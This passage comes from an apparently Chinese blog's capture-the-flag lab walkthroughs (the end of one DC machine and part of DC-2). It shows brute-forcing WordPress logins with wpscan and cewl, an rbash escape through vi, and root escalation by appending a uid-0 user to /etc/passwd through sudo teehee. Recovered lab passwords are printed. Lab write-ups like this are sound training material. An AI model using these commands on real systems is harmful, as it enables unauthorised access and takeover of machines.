/var/mail/jim<br></code></pre></td></tr></table></figure><p>提示错误：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132833915.png" alt="image-20240715132833915"></p><p>再次尝试进入其上一级目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/mail<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> jim<br></code></pre></td></tr></table></figure><p>成功：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132958425.png" alt="image-20240715132958425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133158149.png" alt="image-20240715133158149"></p><p>读取邮件信息可以得到jim的同事，Charles的账户信息：</p><blockquote><p>user：Charles</p><p>password：^xHhA&amp;hvim0y</p></blockquote><p>尝试远程登陆Charles的账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh Charles@192.168.204.133<br></code></pre></td></tr></table></figure><p>因为已经远程登陆了jim账户，所再尝试同时登陆Charles的账户时就会被拒绝请求，因此我们需要在jim终端进行账户切换。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">su Charles<br>su charles<br></code></pre></td></tr></table></figure><p>惹，报错惹：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133710662.png" alt="image-20240715133710662"></p><p>回去查看了一下邮件，发现其对jim的称呼为<code>Jim</code>，猜测实际用户名应该是小写开头。</p><p>ok！成功切换：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133858991.png" alt="image-20240715133858991"></p><p>查看charles用户中具有SUID权限的命令都有哪些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715134104570.png" alt="image-20240715134104570"></p><p>查询结果和jim的一样，再使用<code>sudo -l</code>显示出当前登陆用户的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715134313545.png" alt="image-20240715134313545"></p><p>根据提示信息可以知道，<code>/usr/bin/teehee</code>具有root权限，可以尝试提权。</p><blockquote><p>teehee是一个小众的linux编辑器，若其拥有root权限，则可用于提权。提权的核心思路是：利用其在passwd文件中追加一条uid为0的用户条目。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Name::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd<br></code></pre></td></tr></table></figure><p>这里的<code>Name</code>可以是任意名字。执行该条指令之后，再执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su Name<br></code></pre></td></tr></table></figure><p>即可成功提权！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135103294.png" alt="image-20240715135103294"></p><p>四处查看文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135346117.png" alt="image-20240715135346117"></p><p>退回上一级目录，进行文件匹配查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135445574.png" alt="image-20240715135445574"></p><p>ok！成功找到！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135511759.png" alt="image-20240715135511759"></p><p>提权完毕！</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>使用hydra爆破SSH账户进行提权，其过程要比burpsuite爆破并进行exim4提权的过程要简单和快速。</p><ol><li>信息检索能力很重要，拿到主机shell的时候多去翻翻目录<code>var</code>、<code>home</code>等等目录，找找信息。</li><li>exim4、teehee可以用于提权，多找命令。</li><li>如何使用命令执行反弹shell。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2024/07/24/DC-2/"/>
    <url>/2024/07/24/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>查看kali主机IP：（ifconfig）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827301193.png"></p><p>将目标靶机的“网络适配器”模式改为“NAT”模式，保证其使用与kali相同的模式，即使得二者处于同一个网段内。</p><p>使用nmap扫描确认靶机的IP地址（最好在root权限下进行操作，以防出现权限不足的情况）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p>未打开靶机前进行kali网段IP扫描：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827357707.png" alt="img"></p><p>打开靶机后进行kali网络IP扫描：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827411142.png" alt="img"></p><p>通过对比可以得到，靶机的IP地址为：<code>192.168.204.131</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li><p>普通开放端口扫描</p><p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p><p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.131<br>nmap -sT -p- 192.168.204.131<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827522630.png" alt="img"></p><p>可以看到，开放的端口有<code>80</code>和<code>7744</code>。</p><ul><li><p>开放端口详细扫描</p><p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p><p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p><p><code>-sC</code> ：表示使用默认的脚本进行扫描</p><p><code>-O</code> ：扫描操作系统的版本</p><p><code>-p </code>： 指定扫描端口</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80,7744 192.168.204.131<br></code></pre></td></tr></table></figure><p>扫描结果如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827560872.png" alt="img"></p><p>由扫描结果，似乎没有什么有用的信息，比如目标靶机是使用什么框架的网站之类的。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><p>端口扫描得到的有效信息太少，所以尝试使用gobuster目录爆破去获取更多有用的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.131 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>爆破结果如下:</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827634237.png" alt="img"></p><p>获得三个目标靶机目录下的网页链接:</p><blockquote><p> <a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p> <a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p> <a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p></blockquote><p>对这三个网页逐个进行访问:</p><p>① <a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a> 没有内容加载出来</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827670668.png" alt="img"></p><p>② <a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a> 有很多php脚本文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827720354.png"></p><p>③ <a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a> 无法访问</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827759682.png" alt="img"></p><p>而且可以发现,输入网址<code>http://192.168.204.131/wp-admin/</code>,浏览器总会将其重定向至<code>dc-2</code>导致发生错误。</p><h2 id="重定向修改访问"><a href="#重定向修改访问" class="headerlink" title="重定向修改访问"></a>重定向修改访问</h2><p>访问目标靶机的IP地址，<code>192.168.204.131</code>，查看网页的返回界面。如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827793444.png" alt="img"></p><p>经过多次尝试之后可以得知，每次访问目标靶机IP地址时，其响应网页都会被重定向到域名<code>dc-2</code>。由此判断，该IP地址网页被做了重定向处理。</p><p>回顾之前的nmap详细扫描，已经展现出一些网页重定向的端倪了：</p><p>（由于第一次实验图片丢失，第二遍补做实验的时候nmap详细扫描出来的结果稍有变化，但第一次实验其http-title确实有如下提示）</p><blockquote><p>http-title: Did not follow redirect to <a href="http://dc-2/">http://dc-2/</a></p><p>​  未遵循重定向到<a href="http://dc-2/">http://dc-2/</a></p></blockquote><p>解决重定向处理问题，找到原靶机主页的方法（之一）：</p><blockquote><p>对本地（kali）的host文件进行修改。</p><p>打开 <code>etc/hosts</code>文件，添加本地DNS记录 <code>192.168.204.131 dc-2</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>然后在上方的<code>IP-域名</code>处添加靶机IP与“dc-2”的关联记录。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828170873.png" alt="img"></p><p>然后在浏览器中重新访问靶机IP地址，得到的效果如下：</p><blockquote><p>注意! 这里的DNS记录添加到的是kali内部的<code>hosts</code>文件，所以重定向修改生效的效果也只会在kali虚拟机内部展现出来。</p><p>如果想要在自己的物理主机上也能实现重定向修改的话，需要修改<code>本物理主机的hosts</code>文件。以管理员权限访问 <code>C:\Windows\System32\drivers\etc</code>下的hosts文件，添加靶机IP与“dc-2”的关联记录。</p></blockquote><p>在kali浏览器中访问网址<code>192.168.204.131</code>，得到的效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828285726.png" alt="img"></p><p>可以看到，已经不是之前的重定向无响应界面了，网址的返回网页是正常网页类型。</p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>环视网页内容，可以发现右下角有一个<code>flag1</code>字样的选择栏，点进去：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828251738.png" alt="img"></p><p>flag1有一个提示信息：</p><blockquote><p>Flag 1:</p><p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p><p>你通常的单词表（字典）可能不起作用，因此，也许你只需要（成为）cewl</p></blockquote><p>cewl是什么？经过网络查询。</p><table><thead><tr><th align="left">cewl，自定义词表生成器，是一个ruby程序，是kali linux下的一个工具。可以将特定URL爬取到定义的深度并返回关键字列表（字典）。密码破解者如John the Ripper、Medusa和 WFuzz 可以使用这些关键字来破解密码。Cewl 还有一个相关的命令行应用程序 FAB，它使用相同的元数据提取技术，使用 CeWL 等信息提取算法从已下载的文件中生成作者&#x2F;制作者列表。</th></tr></thead></table><p>Kali Linux字典生成工具Cewl使用全指南：</p><p><a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p><p>你以为接下来就是要开始使用cewl啦？别急，我们先干接下来这事。</p><p>回顾靶场dc-1，我们通过识别nmap漏扫获取了网页的使用框架，然后通过metasploit查找该框架的漏洞。利用漏洞实现了用户登陆以及用户提权。</p><p>所以在dc-2这个靶场中，我们也尝试通过获取目标网页所使用框架等技术构成信息。但是前面的端口扫描也没有扫出什么有用的信息，所以我们尝试使用whatweb指纹工具来进行识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629104913096.png" alt="image-20240629104913096"></p><p>或者利用浏览器插件wappalyer进行指纹识别：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629105413201.png" alt="image-20240629105413201"></p><p>得到的部分信息如下：</p><blockquote><p> WordPress 4.7.10</p><p> Apache 2.4.10</p><p> JQuery 1.12.4</p><p> JQuery MIgrate 1.4.1</p><p> Databases MySQL</p></blockquote><p>其中<code>WordPress</code>是一个广泛使用的开源CMS，基于PHP语言开发。ok，我们又获取了网页的框架信息，尝试查找这个框架的相关漏洞，并尝试利用漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search WordPress<br></code></pre></td></tr></table></figure><p>可以找到有117个漏洞（很多，就不一一截图记录了）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629111815721.png" alt="image-20240629111815721"></p><p>可以尝试使用最新的一个漏洞进行利用尝试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629160813860.png" alt="image-20240629160813860"></p><p>利用这个23年11月的最新高等级的漏洞：</p><p> <code>exploit/multi/http/wp_royal_elementor_addons_rce</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/http/wp_royal_elementor_addons_rce<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161500801.png" alt="image-20240629161500801"></p><p>可以看到，这里的<code>RHOSTS</code>也设置为必须设置，因此我们可以尝试设置其为目标靶机地址<code>192.168.204.131</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.131<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161754704.png" alt="image-20240629161754704"></p><p>执行运行命令：run&#x2F;exploit</p><p>正常来说，如果成功应用的话会返回提示信息“Meterpreter session 1 opened”</p><p>但是根据打印出来的提示信息，发现无论是执行run还是exploit命令，都没有session被成功创建。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161951832.png" alt="image-20240629161951832"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629162306263.png" alt="image-20240629162306263"></p><p>所以这个漏洞我们没法利用。</p><p>尝试利用其它漏洞，但发现修改都没办法应用执行。所以通过漏洞来实现攻击这一方法遇到了瓶颈。</p><p>ok！既然常规思维无法利用漏洞。那么我们就琢磨一下flag1提示的<code>cewl</code>。</p><blockquote><p>cewl -h ：帮助命令，输出所有可接受的选项参数以及对应的选项描述。</p><p>默认方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://www.ignitetechnologies.in/（指定URL）<br></code></pre></td></tr></table></figure><p>输入命令之后，爬虫会根据<strong>指定的URL</strong>和深度进行爬取，然后打印出可用于密码破解的字典。</p><p>若想将打印出的字典存储为文件，则使用<code>-w Name.txt</code>参数来将其存储为txt文件。</p><p>若想生成指定长度的密码字典，则通过使用<code>-m length</code>选项来设置，保证生成的密码长度至少为九位。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://dc-2/ -w CewlDict.txt<br><br><span class="hljs-built_in">cat</span> CewlDict.txt<br></code></pre></td></tr></table></figure><p>得到一个可用于密码破解的字典（关键字列表）文件：</p><blockquote><p>这里访问的URL是通过域名访问的。因为前面的IP地址被重定向过。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629165118422.png" alt="image-20240629165118422"></p><p>通过 cewl 获得一个可用于密码破解的字典之后。之后的正常思路就是寻找登陆界面进行密码爆破攻击。但是前面在解决重定向问题访问靶机地址后返回的网页中，并没有显示出有关用户登陆的任何界面。</p><p>所以我们还得找！</p><p>之前进行目录爆破的时候，我们获取了三个目录链接：</p><blockquote><p><a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p><a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p><a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p></blockquote><p>在kali（本地物理主机的hosts文件未修改，wp-admin界面依然会被重定向到dc-2造成错误）中分别再次访问这三个网页。</p><ul><li><p><a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p>依然没有任何东西：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629170926175.png" alt="image-20240629170926175"></p></li><li><p><a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p>返回的内容仍然是之前的那些，不知道有何作用，没有找到啥有价值的东西。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629171052842.png" alt="image-20240629171052842"></p></li><li><p><a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p><p>原本是无响应的被重定向的界面，现在返回了一个登陆界面。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629171202086.png" alt="image-20240629171202086"></p></li></ul><p>ok！登陆界面找到啦！！！</p><p>捋一下，现在密码字典有了，登陆界面有了，剩下还需要查找用户名，就可以进行密码爆破了。</p><h2 id="wpscan扫描"><a href="#wpscan扫描" class="headerlink" title="wpscan扫描"></a>wpscan扫描</h2><p>什么是wpscan扫描？</p><table><thead><tr><th align="left"><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。常搭配<code>Nikto</code>使用，一款非常棒的<code>Web</code> 服务器评估工具。</th></tr></thead></table><p>使用教程：<a href="https://blog.csdn.net/weixin_41924764/article/details/120984618%EF%BC%88WPScan%E4%BD%BF%E7%94%A8%E5%AE%8C%E6%95%B4%E6%95%99%E7%A8%8B%E4%B9%8B%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9WordPress%E7%9A%84%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%EF%BC%89">https://blog.csdn.net/weixin_41924764/article/details/120984618（WPScan使用完整教程之记一次对WordPress的渗透过程）</a></p><p>为什么是wpscan？</p><p>因为前面进行指纹识别的时候得到的网站信息，其使用了<code>WordPress</code>框架。</p><h3 id="wpscan扫描WordPress有效用户"><a href="#wpscan扫描WordPress有效用户" class="headerlink" title="wpscan扫描WordPress有效用户"></a>wpscan扫描WordPress有效用户</h3><p>通过扫描在wordpress中有效的用户，确定用户的用户名，进而使用密码字典进行爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://dc-2/ -e u<br></code></pre></td></tr></table></figure><p>执行命令（注意是<code>--url</code>两条<code>-</code>哦）。</p><p>在查询结果中，有一块<code>User(s) Identified:</code>（已认证用户）模块选项：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629180120896.png" alt="image-20240629180120896"></p><p>可以看到，有三个已通过认证的用户：</p><blockquote><p>admin</p><p>jerry</p><p>tom</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> usersname.txt<br>vim usersname.txt<br><span class="hljs-built_in">cat</span> usersname.txt<br></code></pre></td></tr></table></figure><p>新建一个文件，将用户名存入文件中，保存退出，cat查看文件内容。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629182533839.png" alt="image-20240629182533839"></p><h3 id="爆破用户密码"><a href="#爆破用户密码" class="headerlink" title="爆破用户密码"></a>爆破用户密码</h3><p>使用获取得到的用户名字典和密码字典进行爆破，获取可登陆用户账户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://dc-2/ -U usersname.txt -P CewlDict.txt<br></code></pre></td></tr></table></figure><p><code>-U</code>：指定用户名字典</p><p><code>-P</code>：指定密码爆破字典</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629185111829.png" alt="image-20240629185111829"></p><p>爆破出两个普通用户的账户密码咯！</p><blockquote><p>Username: jerry, Password: adipiscing</p><p>Username: tom, Password: parturient</p></blockquote><p>使用这两个账号登陆（这里使用jerry的登陆）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629185920193.png" alt="image-20240629185920193"></p><p>浏览当前页面信息，并没有一些有用的信息。</p><p>继续浏览其它模块的界面：</p><p>在<code>Pages</code>模块发现了选项Flag2:</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629191506509.png" alt="image-20240629191506509"></p><p>点进去查看其内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629191548650.png" alt="image-20240629191548650"></p><blockquote><p>If you can’t exploit WordPress and take a shortcut, there is another way.</p><p>Hope you found another entry point.</p><p>如果你不能利用WordPress走捷径，还有另一种方法。</p><p>希望你能找到另一个入口。</p></blockquote><p>此提示也验证了之前我们试图通过Metasploit进行WordPress漏洞的利用是行不通的。</p><p>再来捋一下，我们目前已经获取了用于登陆的两个用户名和密码。且已经明确了无法通过漏洞利用进行 Getshell 以及提权。</p><p>所以我们接下来可以尝试使用已获取的用户密码连接服务器！</p><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>由前面的端口扫描可知，目标靶机开放的端口只有两个<code>80</code>端口和<code>7744</code>端口。</p><p>80端口常用于web网页http服务。代表http协议。通过上述操作，通过网页操作能获得的信息几近尽头。所以我们从7744端口进行切入。由提示信息，7744端口代表的是ssh协议，用于远程服务器连接。</p><p>跟自己远程连接kali的操作类似，只不过这里指定了7744端口：</p><ul><li>对 jerry 账号进行尝试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jerry@192.168.204.131 -p 7744<br></code></pre></td></tr></table></figure><p>但尝试后发现，无论是手打还是复制粘贴，请求都被拒绝了，因此排除密码输入错误的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629192912615.png" alt="image-20240629192912615"></p><ul><li>对 tom 账号进行尝试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh tom@192.168.204.131 -p 7744<br></code></pre></td></tr></table></figure><p>ok！成功登陆上了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629193140246.png" alt="image-20240629193140246"></p><p>连上之后先 <code>ls</code>查看用户下的目录文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629200237330.png" alt="image-20240629200237330"></p><p>只有flag3文件，usr是系统资源文件，没啥太大的参考意义。</p><p><code>cat flag3.txt</code>查看文件内容，发现没有找到<code>cat</code>命令，判定为命令限制。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629201414849.png" alt="image-20240629201414849"></p><p>使用指令查看能够使用的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629201941121.png" alt="image-20240629201941121"></p><p>有很多命令捏，在末尾处有一个常见的linux文件操作指令<code>vi</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629202023822.png" alt="image-20240629202023822"></p><p>使用 vi 打开 flag3.txt 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi flag3.txt<br></code></pre></td></tr></table></figure><p>权限不够，提示要提权：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629202509198.png" alt="image-20240629202509198"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>根据 flag3.txt 文件的提示，我们应该实现<strong>提权</strong>操作。根据上述<code>compgen -c</code>得到的命令信息，<code>vi</code>是linux下常见的文件操作命令。而且vi是vim的先前版本。通过网络搜索得知，vim能够用来实现提权。</p><blockquote><p>vim的主要用途是作为文本编辑器，但若其作为SUID运行，它将继承root用户的权限，因此它可以读取系统上的所有文件。</p><p>vim.tiny &#x2F;etc&#x2F;shadow 访问高密级文件</p><p>还可以通过vim打开shell</p><p>vim.tiny</p><p>：set shell&#x3D;&#x2F;bin&#x2F;sh</p><p>：shell</p></blockquote><p>首先，先使用<code>vi</code>命令随机打开一个文件（flag3.txt），然后按照保存长度文件的步骤，先<code>Esc + ：号</code>输入<code>set shell=/bin/sh</code>，回车，然后再<code>：号</code>输入<code>shell</code>点击回车即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">：<span class="hljs-built_in">set</span> shell=/bin/sh<br><br>：shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629204801206.png" alt="image-20240629204801206"></p><p><code>cd ..</code>返回上一级目录，执行ls的时候发现存在 jerry 和 tom 两个文件夹，可以说是实现了部分提权但仍未获得root用户权限。</p><p>进入jerry文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> jerry<br><br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629205337373.png" alt="image-20240629205337373"></p><p>可以看到有个 flag4 文件，查看其内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi flag4.txt<br></code></pre></td></tr></table></figure><p>（注意不是<code>cat</code>哦！cat被限制了）</p><p>得到如下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629205603521.png" alt="image-20240629205603521"></p><p>根据提示信息，我们还需要去找到最后一个<code>flag</code>，而且它不给我们提示了。</p><p>接下来尝试<code>rbash绕过</code>来实现提权。</p><table><thead><tr><th align="left">rbash 是 restricted bash 的缩写，意思是受限制的 bash。它与shell的区别在于会限制一些行为，让一些命令无法执行。（本文中cat命令被限制）</th></tr></thead></table><blockquote><ul><li>RBASH 是一种特殊的 shell，它限制了用户的一些操作和权限，例如：<ul><li>不能使用 cd 命令来改变当前目录。</li><li>不能使用 set 命令来改变环境变量或 shell 选项。</li><li>不能使用 unset 命令来取消环境变量或 shell 函数。</li><li>不能使用任何包含 &#x2F; 符号的命令，除非它们在 PATH 环境变量中指定了。</li><li>不能重定向输入或输出，例如使用 &gt;, &lt;, &gt;&gt;, &lt;&lt; 等符号。</li><li>只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等。</li></ul></li><li>RBASH 的目的是为了提高系统的安全性，防止用户执行一些危险或不合法的操作。</li></ul></blockquote><p>学习文档：<a 